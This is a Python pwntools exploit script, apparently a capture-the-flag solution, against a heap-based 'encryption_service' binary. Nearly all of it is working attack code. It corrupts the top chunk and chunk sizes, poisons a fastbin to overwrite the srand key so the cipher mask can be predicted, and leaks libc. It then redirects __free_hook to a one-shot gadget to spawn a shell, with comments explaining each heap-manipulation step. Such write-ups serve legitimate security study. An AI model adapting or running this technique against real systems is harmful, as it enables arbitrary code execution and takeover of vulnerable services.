from pwn import *

def alloc(size, data):
	r.sendlineafter('Edit text\n', '1')
	r.sendlineafter('size : ', str(size))

	if size == 0:
		return

	r.sendafter('plaintext : ', data)
	return

def edit(idx, data):
	r.sendlineafter('Edit text\n', '4')
	r.sendlineafter('index : ', str(idx))
	r.sendafter('plaintext : ', data)
	return

def Print(idx):
	r.sendlineafter('Edit text\n', '3')
	r.sendlineafter('index : ', str(idx))
	return

def free(idx):
	r.sendlineafter('Edit text\n', '2')
	r.sendlineafter('index : ', str(idx))
	return

def leak(idx):
	Print(idx)
	r.recvuntil('Cipher: ')
	return u64(r.recv(6).ljust(8, chr(0)))

def pwn():

	for i in xrange(6):
		alloc(0x70, 'kek')

	free(0)

	# But sizes[0] is still 0x70
	alloc(0x20, 'kek') # 0

	# Overflow av->top's size
	edit(0, p64(0)*5 + p64(0x31))

	free(0)

	# _int_malloc will fall under a convenient if case for us since its av->top->size 
	# can't satisfy the allocation request. In particular, it will call malloc_consolidate
	# which will place (and consolidate if it has to) free fast chunks into the unsorted bin list.
	#
	# In our case, it will consolidate the fast chunk of size 0x30 (plus alignment) with
	# the wilderness since they are adjacent, while the original first chunk (let's call it chunk_0) 
	# with size 0x80, which is sitting at the very beginning of the heap, will be placed in the unsorted bin list.
	#
	# After malloc_consolidate is done, _int_malloc will loop through its unsorted chunks once again
	# and this time will find a chunk capable of serving back to us (chunk_0).
	alloc(0x40, 'kek') # 0
	# At the moment, there is an unsorted/last remainder chunk with size 0x30 after the split
	# of the previous allocation. We'll request it, and then use the previous re-allocation
	# of chunk_0 to overwrite the newly allocated chunk's size.
	alloc(0x21, 'kek') # 6

	# Overwrite chunk_6's size with 0x71.
	edit(0, p64(0xb00bface)*8 + p64(0) + p64(0x71))
	# Before free-ing chunk_6, we need to make sure we bypass the check which
	# refers to a valid chunk size at offset chunk_6 + 0x78
	edit(1, p64(0x41)*8) 
	
	free(6)

	# Overwrite chunk_6's FD pointer and make it point to an area
	# close to the key variable.
	edit(0, p64(0xb00bface)*8 + p64(0) + p64(0x71) + p64(0x60203d))

	# Return chunk_6
	alloc(0x68, 'kek')
	# Return 0x60203d and overwrite the srand key with 1 so that we can safely
	# predict the rand() values.
	# Overwrite the LSB of the 0th entry (p8(0x68)) and make it point to the unsorted chunk.
	alloc(0x68, 'pwn' + p64(0xb00bface)*2 + p64(1) + p64(0)*3 + p8(0x68)) # 7
	
	enc = leak(0)

	# gcc -o rand rand.c && ./rand 1
	# 0x6b8b45[67]
	# 0x327b23[c6]
	# 0x643c98[69]
	# 0x663348[73]
	# 0x74b0dc[51]
	# 0x19495c[ff]
	buf  = ''
	buf += xor(enc & 0xff, 0x67)
	buf += xor(((enc & 0xff00) >> 8), 0xc6)
	buf += xor(((enc & 0xff0000) >> 16), 0x69)
	buf += xor(((enc & 0xff000000) >> 24), 0x73)
	buf += xor(((enc & 0xff00000000) >> 32), 0x51)
	buf += xor(((enc & 0xff0000000000) >> 40), 0xff)

	libc    = u64(buf.ljust(8, chr(0))) - 0x3c4b78
	fhook   = libc + 0x3c67a8
	oneshot = libc + 0x4526a
	log.success('Libc: 0x{:x}'.format(libc))
	
	# Overwrite 0th entry of the array with __free_hook's address.
	edit(7, 'pwn' + p64(0xb00bface)*2 + p64(1) + p64(0)*3 + p64(fhook))
	# __free_hook => one shot gadget
	edit(0, p64(oneshot))

	# Trigger __free_hook
	free(1)
	
	r.interactive()

if __name__ == "__main__":
    if sys.argv[1] == "r":
        r = remote('',)
        pwn()
    else:
        r = process('./encryption_service')
        pause()
        pwn()
